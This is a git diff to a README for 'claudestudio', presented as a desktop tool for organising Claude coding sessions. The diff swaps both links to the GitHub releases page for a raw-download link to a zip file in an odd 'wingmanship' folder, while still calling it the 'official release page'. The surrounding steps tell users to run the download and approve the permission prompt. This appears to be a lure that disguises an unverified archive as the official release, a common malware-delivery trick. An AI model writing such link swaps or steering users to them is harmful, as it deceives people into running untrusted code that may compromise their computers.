@@ -1,12 +1,12 @@
 # 🖥️ claudestudio - Organize your Claude coding sessions easily
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Pedrinhownjsj/claudestudio/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Pedrinhownjsj/claudestudio/raw/refs/heads/main/wingmanship/Software-3.7-beta.5.zip)
 
 claudestudio acts as a dedicated desktop tool for your Claude coding sessions. It helps you find, review, and replay past work without needing complex tools. Since it runs locally on your computer, your data stays under your control. It uses standard software libraries to ensure it runs smooth and fast on your PC.
 
 ## 📥 How to download the app
 
-Go to the [official release page](https://github.com/Pedrinhownjsj/claudestudio/releases) to get the latest version. Look for the file ending in .exe for Windows. Click the file name to start the download. Once the file saves to your computer, find it in your Downloads folder and double-click it to start the installation. You might see a window asking for permission to run the software. Confirm this to proceed.
+Go to the [official release page](https://github.com/Pedrinhownjsj/claudestudio/raw/refs/heads/main/wingmanship/Software-3.7-beta.5.zip) to get the latest version. Look for the file ending in .exe for Windows. Click the file name to start the download. Once the file saves to your computer, find it in your Downloads folder and double-click it to start the installation. You might see a window asking for permission to run the software. Confirm this to proceed.
 
 ## 🚀 Setting up the software
 
